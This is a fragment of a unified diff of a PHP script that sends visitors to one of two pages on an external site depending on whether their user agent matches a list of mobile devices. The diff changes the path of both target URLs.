@@ -7,9 +7,9 @@ panasonic|philips|phone|playbook|sagem|sharp|sie-|silk|smartphone|sony|symbian|t
 |up\.browser|up\.link|vodafone|wap|webos|wireless|xda|xoom|zte)/i",$useragent))
 
 {
-header( 'Location: https://f-bilandia.de/heyne/kitzntusch/index.php' );
+header( 'Location: https://f-bilandia.de/cbt/halfbad/index.php' );
 } else {
-header( 'Location: https://f-bilandia.de/heyne/kitzntusch/index_dispatcher.php' );
+header( 'Location: https://f-bilandia.de/cbt/halfbad/index_dispatcher.php' );
 }
 
 ?>
